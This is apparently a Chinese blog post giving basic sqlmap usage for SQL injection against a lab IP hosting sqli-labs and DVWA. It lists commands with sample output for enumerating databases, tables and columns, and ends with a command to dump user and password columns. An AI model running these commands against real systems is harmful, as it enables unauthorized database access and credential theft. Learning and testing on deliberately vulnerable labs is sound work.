sqlmap基本使用命令
发表于 2020-04-19| 更新于 2020-04-19|sqlmap
阅读量:

列举数据库名称

sqlmap -u “url” –dbs
example: sqlmap -u “http://192.168.20.143/sqli/Less-1/?id=1" –dbs

显示效果
available databases [9]:
[*] challenges
[*] dvwa
[*] information_schema
[*] kk
[*] mysql
[*] performance_schema
[*] security
[*] test
[*] xssplatform

列举指定数据库中的表

sqlmap -u “url” -D 数据库名称 –tables
example: sqlmap -u “192.168.20.143/sqli/Less-1/?id=1” –dbs -D dvwa –tables

显示效果
[10:03:36] [INFO] fetching tables for database: ‘dvwa’
[10:03:36] [INFO] resumed: ‘guestbook’
[10:03:36] [INFO] resumed: ‘users’
Database: dvwa
[2 tables]
+————-+
| guestbook |
|     users     |
+————-+

列举表结构

sqlmap -u “url” -D 数据库名称 -T 表名 –columns
example: sqlmap -u “192.168.20.143/sqli/Less-1/?id=1” –dbs -D dvwa -T users –columns

显示效果
Database: dvwa
Table: users
[8 columns]
+————–+————-+
| Column | Type |
+————–+————-+
| password | varchar(32) |
| user | varchar(15) |
| avatar | varchar(70) |
| failed_login | int(3) |
| first_name | varchar(15) |
| last_login | timestamp |
| last_name | varchar(15) |
| user_id | int(6) |
+————–+————-+

显示表中的数据

sqlmap -u “url” –dbs -D 数据库名称 -T 表名 -C id,name,…
example: sqlmap -u “192.168.20.143/sqli/Less-1/?id=1” -D dvwa -T users -C user,password –dump

显示效果
